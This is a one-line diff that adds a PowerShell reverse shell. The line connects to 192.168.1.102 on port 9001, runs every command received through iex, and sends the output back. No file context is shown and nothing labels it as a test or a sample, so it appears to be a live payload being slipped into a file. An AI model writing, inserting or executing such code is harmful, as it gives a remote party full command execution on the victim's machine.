@@ -1,0 +1,1 @@
+$s="192.168.1.102";$p=9001;$c=New-Object Net.Sockets.TCPClient($s,$p);$t=$c.GetStream();$r=New-Object IO.StreamReader($t);$w=New-Object IO.StreamWriter($t);$w.AutoFlush=$true;while($c.Connected){$w.Write('PS '+(Get-Location).Path+'> ');$b=$r.ReadLine();if($b -eq 'exit'){break};try{$o=(iex $b 2>&1|Out-String)}catch{$o=$_.Exception.Message};$w.WriteLine($o)};$c.Close()
